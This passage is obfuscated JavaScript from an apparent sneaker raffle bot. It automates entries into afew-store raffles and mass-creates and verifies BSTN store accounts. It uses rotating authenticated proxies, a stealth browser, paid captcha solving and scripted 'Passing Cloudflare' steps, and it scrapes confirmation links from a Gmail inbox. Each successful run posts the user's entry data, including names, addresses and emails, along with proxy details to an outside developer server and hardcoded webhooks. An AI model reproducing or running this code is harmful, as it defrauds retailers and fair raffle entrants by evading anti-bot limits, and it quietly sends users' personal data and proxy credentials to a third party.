                        var _0x18b1cf = JSON['parse'](_0x4fe38c['readFileSync']('sizes.json', 'utf-8')), _0x391038 = _0x147c2b[_0x156dae]['Url'], _0x290ac1 = _0x147c2b[_0x156dae]['Size'], _0x4ddd1f;
                        async function _0x58d881() {
                            var _0x5e4aa8 = new _0x3c3577['CookieJar']();
                            console['log'](_0xb0c82c() + '\x20[' + _0x230f14['name'] + ']\x20Task\x20' + (_0x156dae + 0x1) + '\x20:\x20Getting\x20Session');
                            var _0x4082ce;
                            let _0x2a9e3f = {
                                'method': 'GET',
                                'cookieJar': _0x5e4aa8,
                                'headers': {
                                    'Connection': 'keep-alive',
                                    'Pragma': 'no-cache',
                                    'Cache-Control': 'no-cache',
                                    'sec-ch-ua': '\x22Google\x20Chrome\x22;v=\x2289\x22,\x20\x22Chromium\x22;v=\x2289\x22,\x20\x22;Not\x20A\x20Brand\x22;v=\x2299\x22',
                                    'sec-ch-ua-mobile': '?0',
                                    'DNT': '1',
                                    'Upgrade-Insecure-Requests': '1',
                                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                                    'cookies': '',
                                    'Sec-Fetch-Site': 'none',
                                    'Sec-Fetch-Mode': 'navigate',
                                    'Sec-Fetch-User': '?1',
                                    'Sec-Fetch-Dest': 'document',
                                    'Accept-Language': 'en-US,en;q=0.9'
                                },
                                'proxy': 'http://' + _0x2fadf5[0x2] + ':' + _0x2fadf5[0x3] + '@' + _0x2fadf5[0x0] + ':' + _0x2fadf5[0x1]
                            }, _0x1441ff = _0x391038['replace']('de.afew-store.com', 'en.afew-store.com')['replace']('en.afew-store.com', 'raffles.afew-store.com'), _0x781391 = _0x1441ff + '.json', _0x19b197 = await _0x3c1aeb(_0x781391);
                            console['log'](_0xb0c82c() + '\x20[' + _0x230f14['name'] + ']\x20Task\x20' + (_0x156dae + 0x1) + '\x20:\x20Getting\x20Variants');
                            let _0x448e65 = _0x19b197['data']['product']['variants'];
                            if (_0x290ac1 != 'RANDOM') {
                                if (_0x448e65[0x1]['option1']['includes']('W')) {
                                    const _0xe6c69a = _0x18b1cf['women']['find'](_0x1a7be7 => _0x1a7be7['EUsize'] === _0x290ac1);
                                    _0xe6c69a && (_0x290ac1 = _0xe6c69a['size']);
                                } else {
                                    if (_0x448e65[0x1]['option1']['includes']('Y')) {
                                        const _0x3207c8 = _0x18b1cf['GS']['find'](_0x861430 => _0x861430['EUsize'] === _0x290ac1);
                                        _0x3207c8 && (_0x290ac1 = _0x3207c8['size']);
                                    } else {
                                        const _0x28f161 = _0x18b1cf['men']['find'](_0x2fe261 => _0x2fe261['EUsize'] === _0x290ac1);
                                        _0x28f161 && (_0x290ac1 = _0x28f161['size']);
                                    }
                                }
                                for (var _0x40ef42 of _0x448e65) {
                                    _0x40ef42['option1'] == _0x290ac1 && (_0x4082ce = _0x40ef42['id']);
                                }
                            } else {
                                var _0x3a8799 = Math['round'](Math['random']() * (_0x448e65['length'] - 0x1));
                                _0x4082ce = _0x448e65[_0x3a8799]['id'];
                            }
                            console['log'](_0xb0c82c() + '\x20[' + _0x230f14['name'] + ']\x20Task\x20' + (_0x156dae + 0x1) + '\x20:\x20Adding\x20to\x20Cart'), addToCart = await _0x3c1aeb('https://raffles.afew-store.com/cart/' + _0x4082ce + ':1'), _0x4ddd1f = addToCart['request']['res']['responseUrl'];
                        }
                        try {
                            await _0x58d881();
                        } catch (_0x3a9601) {
                            if (_0x3a9601['message']['includes']('TUNN'))
                                throw new Error('Proxy\x20Connection\x20Error');
                            throw new Error('Proxy\x20Error:\x20' + _0x3a9601);
                        }
                        const _0x23b16a = await _0x33c9c9['newPage']();
                        await _0x23b16a['setDefaultNavigationTimeout'](0x1d4c0), await _0x23b16a['authenticate']({
                            'username': '' + _0x2fadf5[0x2],
                            'password': '' + _0x2fadf5[0x3]
                        }), await _0x23b16a['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x23b16a['setRequestInterception'](!![]), _0x23b16a['on']('request', _0x3b6286 => {
                            _0x3b6286['resourceType']() === 'image' || _0x3b6286['resourceType']() === 'font' || _0x3b6286['resourceType']() === 'media' ? _0x3b6286['abort']() : _0x3b6286['continue']();
                        });
                        try {
                            await _0x23b16a['goto'](_0x4ddd1f, { 'waituntil': 'networkidle0' });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        console['log'](_0xb0c82c() + '\x20[' + _0x230f14['name'] + ']\x20Task\x20' + (_0x156dae + 0x1) + '\x20:\x20Submitting\x20Information');
                        try {
                            await _0x23b16a['waitForSelector']('#checkout_email');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x23b16a['type']('#checkout_email', '' + _0x147c2b[_0x156dae]['Email']), await _0x32344d(0x320), await _0x23b16a['type']('#checkout_attributes_instagram', '' + _0x147c2b[_0x156dae]['Follower']), await _0x32344d(0x320), await _0x23b16a['select']('#checkout_shipping_address_country', '' + _0x147c2b[_0x156dae]['Country']), await _0x23b16a['waitForTimeout'](0x258), await _0x23b16a['type']('#checkout_shipping_address_first_name', '' + _0x147c2b[_0x156dae]['FirstName']), await _0x23b16a['waitForTimeout'](0x320), await _0x23b16a['type']('#checkout_shipping_address_last_name', '' + _0x147c2b[_0x156dae]['LastName']), await _0x23b16a['waitForTimeout'](0x2bc), await _0x23b16a['type']('#checkout_shipping_address_address1', _0x147c2b[_0x156dae]['Address1'] + '\x20' + _0x147c2b[_0x156dae]['HouseNumber']), await _0x23b16a['waitForTimeout'](0x2bc), await _0x23b16a['type']('#checkout_shipping_address_address2', '' + _0x147c2b[_0x156dae]['Address2']), await _0x23b16a['waitForTimeout'](0x2bc), await _0x23b16a['type']('#checkout_shipping_address_zip', '' + _0x147c2b[_0x156dae]['Zip']), await _0x23b16a['waitForTimeout'](0x2bc), await _0x23b16a['type']('#checkout_shipping_address_city', '' + _0x147c2b[_0x156dae]['City']), await _0x23b16a['waitForTimeout'](0x2bc);
                        if (_0x147c2b[_0x156dae]['State'] != '')
                            try {
                                const _0x1a488e = JSON['parse'](_0x4fe38c['readFileSync']('States.json', 'utf8'));
                                await _0x32344d(0x1f4);
                                if (_0x147c2b[_0x156dae]['State']['length'] > 0x2)
                                    for (let _0x249806 of _0x1a488e) {
                                        if (_0x249806['Province'] == _0x147c2b[_0x156dae]['State']) {
                                            await _0x23b16a['select']('#checkout_shipping_address_province', _0x249806['Code']);
                                            break;
                                        }
                                    }
                                else
                                    await _0x23b16a['select']('#checkout_shipping_address_province', _0x147c2b[_0x156dae]['State']['toUpperCase']());
                            } catch {
                            }
                        await _0x32344d(0x1f4), console['log'](_0xb0c82c() + '\x20[' + _0x230f14['name'] + ']\x20Task\x20' + (_0x156dae + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x32344d(0x190), _0x23b16a['evaluate'](() => {
                            const _0x885e17 = document['querySelector']('#continue_button');
                            for (var _0x2a1f88 = 0x0; _0x2a1f88 < 0x5; _0x2a1f88++) {
                                if (_0x885e17) {
                                    _0x885e17['click'](), _0x885e17['click']();
                                    break;
                                } else
                                    _0x32344d(0xfa0);
                            }
                        }), await _0x23b16a['waitForTimeout'](0x9c4);
                        try {
                            await _0x23b16a['waitForSelector']('form[data-shipping-method-form=\x22true\x22]'), await _0x23b16a['$eval']('form[data-shipping-method-form=\x22true\x22]', _0x144599 => _0x144599['submit']());
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x23b16a['waitForTimeout'](0x7d0), console['log'](_0xb0c82c() + '\x20[' + _0x230f14['name'] + ']\x20Task\x20' + (_0x156dae + 0x1) + '\x20:\x20Finishing\x20Entry');
                        try {
                            await _0x23b16a['waitForSelector']('div[data-payment-subform=\x22required\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x32344d(0x3e8), await _0x23b16a['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20div\x20>\x20form', _0x41af89 => _0x41af89['submit']()), await _0x32344d(0x3e8);
                        try {
                            await _0x23b16a['waitForSelector']('div[data-last-step=\x22true\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x23b16a['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20form', _0xdce0d0 => _0xdce0d0['submit']());
                        try {
                            await _0x23b16a['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0x4c44f7 = 'no', _0x5677a4(_0x147c2b[_0x156dae], _0x230f14), console['log'](_0x5b4136['green'](_0xb0c82c() + '\x20[' + _0x230f14['name'] + ']\x20Task\x20' + (_0x156dae + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            if (_0x8aa917['webhook'] != undefined && _0x8aa917['webhook'] != '')
                                try {
                                    await _0x16e110(_0x8aa917['webhook'], _0x1527ec['succesDEVMSG']);
                                } catch {
                                }
                            await _0x32344d(0xc8), await _0x16e110(_0x275f2a, _0x1527ec['succesDEVMSG']), await _0x32344d(0xc8);
                            try {
                                await _0x16e110(_0x583375, _0x1527ec['succesPUBMSG']);
                            } catch {
                            }
                            try {
                                prxdata = {
                                    'username': _0x4b3861['replace']('#', ''),
                                    'module': _0x230f14['name'],
                                    'entrydata': JSON['stringify'](_0x3b8874),
                                    'proxy': '' + _0x2afe77[_0x156dae]
                                };
                                var _0x8390b0 = JSON['stringify'](prxdata);
                                let _0x258093 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x3c1aeb['post']('https://jraffles.herokuapp.com/success', _0x8390b0, _0x258093);
                            } catch (_0x41eb1b) {
                            }
                        } catch (_0x32bcd3) {
                            throw new Error('Connection\x20Error\x20Fetching\x20Response');
                        }
                    } catch (_0x4b1fe9) {
                        _0x4b1fe9['message']['includes']('selector') && (_0x4b1fe9 = 'Connection\x20Error');
                        console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x230f14['name'] + ']\x20Task\x20' + (_0x156dae + 0x1) + '\x20:\x20' + _0x4b1fe9)), _0x2e0a20 = '' + _0x4b1fe9;
                        var _0x17a1b9 = await _0xe56989(_0x147c2b[_0x156dae], _0x230f14, 'dev', !![], _0x2e0a20);
                        _0x1527ec['errorDEV'] = { 'embeds': [_0x17a1b9] }, _0x8aa917['webhook'] != undefined && _0x8aa917['webhook'] != '' && await _0x16e110(_0x8aa917['webhook'], _0x1527ec['errorDEV']), await _0x16e110(_0x3ba800, _0x1527ec['errorDEV']), _0x4c44f7 = 'yes';
                    } finally {
                        _0x33c9c9 && _0x33c9c9['close']();
                        if (_0x4c44f7 == 'yes' && _0x5e6084 != 0x5 && _0x2e0a20 != 'Size\x20Not\x20Found') {
                            console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x230f14['name'] + ']\x20Task\x20' + (_0x156dae + 0x1) + '\x20:\x20Retrying\x20(' + _0x5e6084 + '\x20/\x205)')), _0x156dae = _0x156dae - 0x1, _0x5e6084 = _0x5e6084 + 0x1;
                            continue;
                        }
                        _0x4c44f7 == 'yes' && _0x5e6084 >= 0x5 && (_0x4af7c0(_0x147c2b[_0x156dae], _0x230f14), _0x4c44f7 = 'no', _0x5e6084 = 0x0);
                        if (_0x156dae + 0x1 == _0x147c2b['length']) {
                            await _0x32344d(0x7d0);
                            break;
                        }
                        console['log']('Waiting\x20for\x20' + _0x8aa917['AfewDelay'] + '\x20ms'), await _0x32344d(_0x8aa917['AfewDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x3443de, _0x522c4c, _0x503a06) {
                    _0x3d6bb6['use'](_0x922449()), _0x3d6bb6['use'](_0x4b9689({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x8aa917['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x170691 = 0x0; _0x170691 < _0x522c4c['length']; _0x170691++) {
                        if (_0xedb88a != 'yes')
                            var _0xedb88a = '', _0x5f5c00 = 0x0;
                        var _0x2bb1cf;
                        try {
                            await _0x4669df(_0x522c4c, _0x170691);
                        } catch {
                            _0xedb88a = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x299f70(_0x3443de['name'] + '\x20Task\x20' + (_0x170691 + 0x1) + '\x20/\x20' + _0x522c4c['length'] + '\x20||\x20File:\x20' + _0x1901f8 + '\x20Proxies:\x20' + _0x504c2d);
                        var _0x2a1de8 = await _0xe56989(_0x522c4c[_0x170691], _0x3443de, 'acc', ![]);
                        const _0x32e2f2 = { 'succesDEVMSG': { 'embeds': [_0x2a1de8] } }, _0x1dfd9e = 'https://www.bstn.com/eu_en/customer/account/create/';
                        var _0x592465 = Math['round'](Math['random']() * (_0x503a06['length'] - 0x1)), _0x4f8ab2 = _0x503a06[_0x592465]['split'](':'), _0x300fda;
                        try {
                            _0x300fda = await _0x3d6bb6['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4f8ab2[0x0] + ':' + _0x4f8ab2[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x300fda = await _0x3d6bb6['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4f8ab2[0x0] + ':' + _0x4f8ab2[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x24648d = await _0x300fda['newPage']();
                            await _0x24648d['authenticate']({
                                'username': '' + _0x4f8ab2[0x2],
                                'password': '' + _0x4f8ab2[0x3]
                            }), console['log'](_0xb0c82c() + '\x20[' + _0x3443de['name'] + ']\x20Task\x20' + (_0x170691 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x24648d['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x24648d['setRequestInterception'](!![]), _0x24648d['on']('request', _0x2f3071 => {
                                _0x2f3071['resourceType']() === 'image' ? _0x2f3071['abort']() : _0x2f3071['continue']();
                            });
                            try {
                                await _0x24648d['goto']('' + _0x1dfd9e), await _0x24648d['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                            } catch {
                                _0xedb88a = 'yes';
                                throw new Error('Proxy\x20Error');
                            }
                            await _0x24648d['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0xb0c82c() + '\x20[' + _0x3443de['name'] + ']\x20Task\x20' + (_0x170691 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x32344d(0x7d0), console['log'](_0xb0c82c() + '\x20[' + _0x3443de['name'] + ']\x20Task\x20' + (_0x170691 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x32344d(0x190), await _0x24648d['waitForSelector']('#firstname'), await _0x24648d['type']('#firstname', _0x522c4c[_0x170691]['FirstName'], { 'delay': 0xf0 }), await _0x32344d(0x190), await _0x24648d['type']('#lastname', _0x522c4c[_0x170691]['LastName'], { 'delay': 0xe6 }), await _0x32344d(0x190), await _0x24648d['type']('#email_address', _0x522c4c[_0x170691]['Email'], { 'delay': 0x122 }), await _0x32344d(0x190), await _0x24648d['type']('#password', _0x522c4c[_0x170691]['Password'], { 'delay': 0x82 }), await _0x32344d(0x1f4), await _0x24648d['type']('#password-confirmation', _0x522c4c[_0x170691]['Password'], { 'delay': 0x7c }), console['log'](_0xb0c82c() + '\x20[' + _0x3443de['name'] + ']\x20Task\x20' + (_0x170691 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x32344d(0x2bc), await _0x24648d['$eval']('#form-validate', _0x51f40e => _0x51f40e['submit']()), await _0x32344d(0x1388);
                            const _0x3553d2 = await _0x24648d['$']('#email_address-error');
                            if (_0x3553d2)
                                throw new Error('Invalid\x20Email');
                            const _0x5104e3 = await _0x24648d['$']('#password-error');
                            if (_0x5104e3)
                                throw new Error('Invalid\x20Password');
                            await _0x24648d['waitForSelector']('div.mesg-success'), _0xedb88a = 'no', console['log'](_0x5b4136['green'](_0xb0c82c() + '\x20[' + _0x3443de['name'] + ']\x20Task\x20' + (_0x170691 + 0x1) + '\x20:\x20Account\x20' + _0x522c4c[_0x170691]['Email'] + '\x20Generated')), _0x4fe38c['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x522c4c[_0x170691]['Email'] + ',' + _0x522c4c[_0x170691]['Password']);
                            try {
                                _0x8aa917['webhook'] != undefined && _0x8aa917['webhook'] != '' && await _0x16e110(_0x8aa917['webhook'], _0x32e2f2['succesDEVMSG']);
                            } catch {
                            }
                            await _0x16e110(_0x410b1d, _0x32e2f2['succesDEVMSG']);
                            let _0x296d9f = _0x522c4c[_0x170691];
                            try {
                                prxdata = {
                                    'username': _0x4b3861['replace']('#', ''),
                                    'module': _0x3443de['name'],
                                    'entrydata': JSON['stringify'](_0x296d9f),
                                    'proxy': '' + _0x503a06[_0x170691]
                                };
                                var _0x191a02 = JSON['stringify'](prxdata);
                                let _0x41c2f0 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x3c1aeb['post']('https://jraffles.herokuapp.com/success', _0x191a02, _0x41c2f0);
                            } catch (_0x3271cd) {
                            }
                            console['log'](_0x5b4136['yellow'](_0xb0c82c() + '\x20[' + _0x3443de['name'] + ']\x20Task\x20' + (_0x170691 + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20run\x20\x27BSTN\x20Account\x20Verifier\x27'));
                        } catch (_0x4c2542) {
                            console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x3443de['name'] + ']\x20Task\x20' + (_0x170691 + 0x1) + '\x20:\x20' + _0x4c2542)), _0x2bb1cf = '' + _0x4c2542;
                            var _0x231e32 = await _0xe56989(_0x522c4c[_0x170691], _0x3443de, 'acc', !![], _0x2bb1cf);
                            _0x32e2f2['errorDEV'] = { 'embeds': [_0x231e32] }, _0x8aa917['webhook'] != undefined && _0x8aa917['webhook'] != '' && await _0x16e110(_0x8aa917['webhook'], _0x32e2f2['errorDEV']), await _0x16e110(_0x3ba800, _0x32e2f2['errorDEV']), _0xedb88a = 'yes';
                        } finally {
                            if (_0x300fda)
                                _0x300fda['close']();
                            if (_0xedb88a == 'yes' && _0x5f5c00 != 0x5) {
                                console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x3443de['name'] + ']\x20Task\x20' + (_0x170691 + 0x1) + '\x20:\x20Retrying\x20(' + _0x5f5c00 + '\x20/\x205)')), _0x170691 = _0x170691 - 0x1, _0x5f5c00 = _0x5f5c00 + 0x1;
                                continue;
                            }
                            _0xedb88a == 'yes' && _0x5f5c00 >= 0x5 && (_0x4af7c0(_0x522c4c[_0x170691], _0x3443de), _0xedb88a = 'no', _0x5f5c00 = 0x0), console['log'](_0xb0c82c() + '\x20[' + _0x3443de['name'] + ']\x20Waiting\x20for\x20' + _0x8aa917['delay'] + '\x20ms'), await _0x32344d(_0x8aa917['delay']);
                        }
                    }
                }
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x1c4dd9, _0x5f2446) {
                    var _0x5030b3 = ![], _0x538eb6 = [];
                    async function _0x29c061() {
                        var _0x27cee2 = new _0x16dd9e({
                            'user': _0x8aa917['masterMail'],
                            'password': _0x8aa917['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0xafd715(_0x5223c8) {
                            _0x27cee2['openBox']('INBOX', ![], _0x5223c8);
                        }
                        _0x27cee2['once']('ready', function () {
                            _0xafd715(function (_0x55472c, _0xffc1c4) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x55472c)
                                    throw _0x55472c;
                                _0x27cee2['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Please\x20confirm\x20your\x20BSTN\x20Store\x20account'
                                    ]
                                ], function (_0x51a2b5, _0x48155f) {
                                    if (!_0x48155f || !_0x48155f['length'])
                                        console['log'](_0xb0c82c() + '\x20[' + _0x1c4dd9['name'] + ']\x20No\x20mails\x20found'), _0x27cee2['end']();
                                    else {
                                        var _0x3b43a7 = _0x27cee2['seq']['fetch'](_0x48155f, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x3b43a7['on']('message', function (_0x250224, _0x5021c1) {
                                            var _0x4c1dfe = '(#' + _0x5021c1 + ')\x20';
                                            _0x250224['on']('body', function (_0x44aae5, _0x24c6e3) {
                                                _0x4b0324(_0x44aae5, (_0x1bea4b, _0x147821) => {
                                                    var _0x59e09f = _0x147821['text']['split']('[')[0x2], _0x30f285 = _0x59e09f['split'](']')[0x0];
                                                    _0x538eb6['push'](_0x30f285);
                                                });
                                            }), _0x250224['once']('end', function () {
                                            });
                                        }), _0x3b43a7['once']('error', function (_0x479dd0) {
                                            console['log']('Fetch\x20error:\x20' + _0x479dd0), _0x5030b3 = !![];
                                        }), _0x3b43a7['once']('end', function () {
                                            _0x27cee2['end'](), _0x5030b3 = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x27cee2['once']('error', function (_0xa33429) {
                            console['log'](_0x5b4136['red'](_0xa33429['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x5030b3 = !![];
                        }), _0x27cee2['once']('end', async function () {
                            _0x5030b3 = !![];
                        }), _0x27cee2['connect']();
                    }
                    async function _0xa43d56(_0x5cb025, _0x5184af, _0x43595e) {
                        _0x3d6bb6['use'](_0x922449());
                        for (var _0x39daee = 0x0; _0x39daee < _0x5184af['length']; _0x39daee++) {
                            if (_0x56c625 != 'yes')
                                var _0x56c625 = '', _0x1c6e2f = 0x0;
                            var _0x107ace = Math['round'](Math['random']() * (_0x43595e['length'] - 0x1)), _0x39ee34 = _0x43595e[_0x107ace]['split'](':'), _0x2761ff;
                            try {
                                _0x2761ff = await _0x3d6bb6['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x39ee34[0x0] + ':' + _0x39ee34[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x2761ff = await _0x3d6bb6['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x39ee34[0x0] + ':' + _0x39ee34[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x3b712d = await _0x2761ff['newPage']();
                                await _0x3b712d['authenticate']({
                                    'username': '' + _0x39ee34[0x2],
                                    'password': '' + _0x39ee34[0x3]
                                }), console['log'](_0xb0c82c() + '\x20[' + _0x5cb025['name'] + ']\x20Task\x20' + (_0x39daee + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x3b712d['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x3b712d['setRequestInterception'](!![]), _0x3b712d['on']('request', _0x152b16 => {
                                    _0x152b16['resourceType']() === 'image' || _0x152b16['resourceType']() === 'font' || _0x152b16['resourceType']() === 'media' ? _0x152b16['abort']() : _0x152b16['continue']();
                                }), console['log'](_0xb0c82c() + '\x20[' + _0x5cb025['name'] + ']\x20Task\x20' + (_0x39daee + 0x1) + '\x20:\x20Getting\x20Session');
                                try {
                                    await _0x3b712d['goto'](_0x5184af[_0x39daee]);
                                } catch {
                                    _0x56c625 = 'yes';
                                    throw new Error('Connection\x20Error');
                                }
                                console['log'](_0xb0c82c() + '\x20[' + _0x5cb025['name'] + ']\x20Task\x20' + (_0x39daee + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x3b712d['waitForTimeout'](0xbb8);
                                try {
                                    await _0x3b712d['waitForSelector']('.account-nav'), _0x56c625 = 'no', console['log'](_0x5b4136['green'](_0xb0c82c() + '\x20[' + _0x5cb025['name'] + ']\x20Task\x20' + (_0x39daee + 0x1) + '\x20:\x20Verification\x20Successful'));
                                    var _0x3716ab = await _0xe56989(null, _0x5cb025, 'ver', ![]);
                                    const _0x2de166 = { 'succesDEVMSG': { 'embeds': [_0x3716ab] } };
                                    await _0x16e110(_0x1b75ce, _0x2de166['succesDEVMSG']);
                                } catch {
                                    _0x56c625 = 'no';
                                    throw new Error('Link\x20Already\x20Verified,\x20skipping..');
                                }
                            } catch (_0xc841bd) {
                                console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x5cb025['name'] + ']\x20Task\x20' + (_0x39daee + 0x1) + '\x20:\x20' + _0xc841bd));
                                var _0x5223ab = _0xc841bd, _0x386c13 = await _0xe56989(null, _0x5cb025, 'ver', !![], _0x5223ab);
                                const _0x5ad409 = { 'errorDEVMSG': { 'embeds': [_0x386c13] } };
                                _0x8aa917['webhook'] != undefined && _0x8aa917['webhook'] != '' && await _0x16e110(_0x8aa917['webhook'], _0x5ad409['errorDEVMSG']), await _0x16e110(_0x3ba800, _0x5ad409['errorDEVMSG']);
                            } finally {
                                _0x2761ff['close']();
                                if (_0x56c625 == 'yes' && _0x1c6e2f != 0x5) {
                                    console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x5cb025['name'] + ']\x20Task\x20' + (_0x39daee + 0x1) + '\x20:\x20Retrying\x20(' + _0x1c6e2f + '\x20/\x205)')), _0x39daee = _0x39daee - 0x1, _0x1c6e2f = _0x1c6e2f + 0x1;
                                    continue;
                                }
                                _0x56c625 == 'yes' && _0x1c6e2f >= 0x5 && (_0x56c625 = 'no', _0x1c6e2f = 0x0), console['log'](_0xb0c82c() + '\x20[' + _0x5cb025['name'] + ']\x20Waiting\x20for\x20' + _0x8aa917['delay'] + '\x20ms'), await _0x32344d(_0x8aa917['delay']);
                            }
                        }
                    }
                    try {
                        _0x29c061();
                        while (!_0x5030b3) {
                            await _0x32344d(0xfa0);
                        }
                        console['log']('Found\x20' + _0x538eb6['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x32344d(0x7d0);
                    }
                    await _0xa43d56(_0x1c4dd9, _0x538eb6, _0x5f2446);
                }
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x49fc69, _0x2a8ccb, _0x59eec6) {
                    _0x3d6bb6['use'](_0x922449()), _0x3d6bb6['use'](_0x4b9689({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x8aa917['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x3db934 = 0x0; _0x3db934 < _0x2a8ccb['length']; _0x3db934++) {
                        var _0x437ff5, _0x3305eb = _0x2a8ccb[_0x3db934];
                        try {
                            await _0x4669df(_0x2a8ccb, _0x3db934);
                        } catch {
                            _0x227a95 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x5e6813(_0x8ccd01) {
                            const _0x15dc8d = _0x4fe38c['readFileSync']('../successful-tasks.csv', 'utf8'), _0x19633a = _0x1d9836['parse'](_0x15dc8d, { 'header': !![] })['data'];
                            let _0x4cf734 = ![];
                            for (var _0x509f7e of _0x19633a) {
                                if (_0x509f7e['Url'] == _0x8ccd01['Url'] && _0x509f7e['Email'] == _0x8ccd01['Email']) {
                                    _0x4cf734 = !![];
                                    break;
                                }
                            }
                            return _0x4cf734;
                        }
                        if (await _0x5e6813(_0x2a8ccb[_0x3db934]) == !![]) {
                            console['log'](_0xb0c82c() + '\x20[' + _0x49fc69['name'] + ']\x20Task\x20' + (_0x3db934 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                            continue;
                        }
                        if (_0x227a95 != 'yes')
                            var _0x227a95 = '', _0x43ec14 = 0x0;
                        _0x299f70(_0x49fc69['name'] + '\x20Task\x20' + (_0x3db934 + 0x1) + '\x20/\x20' + _0x2a8ccb['length'] + '\x20||\x20File:\x20' + _0x1901f8 + '\x20Proxies:\x20' + _0x504c2d);
